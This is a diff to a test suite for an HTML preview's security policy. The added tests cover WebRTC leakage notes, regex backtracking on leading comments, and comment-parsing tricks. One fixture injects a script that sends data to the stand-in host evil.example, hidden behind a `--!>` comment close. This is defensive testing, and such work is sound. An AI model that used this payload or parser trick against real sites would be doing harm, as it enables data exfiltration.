@@ -6,6 +6,7 @@ import {
   HtmlPreview,
   PREVIEW_CSP,
   inlineStyles,
+  leadingDoctypeEnd,
   localStylesheets,
   siblingOf,
   withPreviewPolicy,
@@ -99,6 +100,19 @@ describe("HtmlPreview", () => {
     expect(await screen.findByText(/cdn\.jsdelivr\.net/)).toBeTruthy();
   });
 
+  it("does not promise a sealed frame, in any language", () => {
+    // Measured in Edge with both policies on: the frame's fetch was blocked, but WebRTC reached a
+    // STUN server over UDP and a TURN server over TCP — CSP does not govern it. An earlier version
+    // of the note said requests to other sites "are blocked", full stop. Every language must name
+    // the channel that is still open, so the sentence cannot drift back into a guarantee.
+    const [source] = Object.values(
+      import.meta.glob("../../lib/i18n.tsx", { query: "?raw", import: "default", eager: true }) as Record<string, string>,
+    );
+    const notes = [...source.matchAll(/^ {2}"code\.preview\.note": "(.*)",$/gm)].map((m) => m[1]);
+    expect(notes).toHaveLength(10);
+    for (const note of notes) expect(note).toContain("WebRTC");
+  });
+
   it("still offers the source", async () => {
     const user = userEvent.setup();
     const { container } = renderWithProviders(
@@ -170,5 +184,31 @@ describe("the preview policy", () => {
   it("keeps a leading doctype first, so the page stays in standards mode", () => {
     const doc = withPreviewPolicy("<!-- made by the agent -->\n<!DOCTYPE html><html><head></head></html>");
     expect(doc.startsWith("<!-- made by the agent -->\n<!DOCTYPE html><meta ")).toBe(true);
+  });
+
+  it("finds the doctype in time however many comments come before it", () => {
+    // The regex this replaced backtracked exponentially on leading comments with no doctype after
+    // them: 28 took 13 s in node, and the preview computes this on every .html file opened — so a
+    // 300-byte page the agent wrote froze the window. Linear now; 40 is far past where it hung.
+    const page = "<!--a-->".repeat(40) + "<p>x</p>";
+    const started = performance.now();
+    const doc = withPreviewPolicy(page);
+    expect(performance.now() - started).toBeLessThan(50);
+    expect(doc.startsWith("<meta ")).toBe(true);
+    // And with a doctype after them, it still lands after the doctype.
+    const withDoctype = "<!--a-->".repeat(40) + "<!doctype html><p>x</p>";
+    expect(withPreviewPolicy(withDoctype)).toContain("<!doctype html><meta ");
+  });
+
+  it("ends a comment where the parser does, so a script after `--!>` cannot run first", () => {
+    // `--!>` closes a comment for the HTML parser. Reading only `-->`, the old match took the
+    // script below as part of a comment, found the doctype after it, and put the policy after a
+    // script the browser runs.
+    const page = "<!-- a --!><script>fetch('https://evil.example/?d=1')</script>--><!doctype html><p>x</p>";
+    const doc = withPreviewPolicy(page);
+    expect(doc.indexOf("Content-Security-Policy")).toBeLessThan(doc.indexOf("<script>"));
+    // The abrupt `<!-->` is a whole comment too, and an unclosed one hides any doctype after it.
+    expect(leadingDoctypeEnd("<!-->\n<!DOCTYPE html><p>")).toBe("<!-->\n<!DOCTYPE html>".length);
+    expect(leadingDoctypeEnd("<!-- never closed <!doctype html>")).toBe(0);
   });
 });
